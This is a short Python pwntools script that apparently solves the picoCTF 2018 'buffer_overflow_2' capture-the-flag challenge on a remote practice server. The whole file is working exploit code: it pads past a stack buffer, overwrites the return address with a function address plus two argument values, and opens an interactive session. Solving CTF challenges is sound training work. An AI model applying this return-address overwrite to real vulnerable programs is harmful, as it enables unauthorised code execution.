from pwn import *
from LibcSearcher import LibcSearcher

#context(os='linux', arch='amd64', log_level='debug')
#
context(os='linux', arch='i386', log_level='debug')
#io = process('./picoCTF_2018_buffer_overflow_2')
#
io = connect('node5.buuoj.cn',29425)
elf=ELF('./picoCTF_2018_buffer_overflow_2')
#gdb.attach(io)

def rl():
	io.recvline()
def ru(s):
	io.recvuntil(s)
def sl(s):
	io.sendline(s)
def sd(s):
	io.send(s)
def logsc(s):
	log.success(s)

def plt(s):
	return elf.plt[s]
def got(s):
	return elf.got[s]

ru('Please enter your string: \n')
fa=0x080485CB
a1=0xDEADBEEF
a2=0xDEADC0DE
pl=b'b'*(0x6c+4)
pl+=p32(fa)+p32(0)+p32(a1)+p32(a2)
sl(pl)

#
io.interactive()
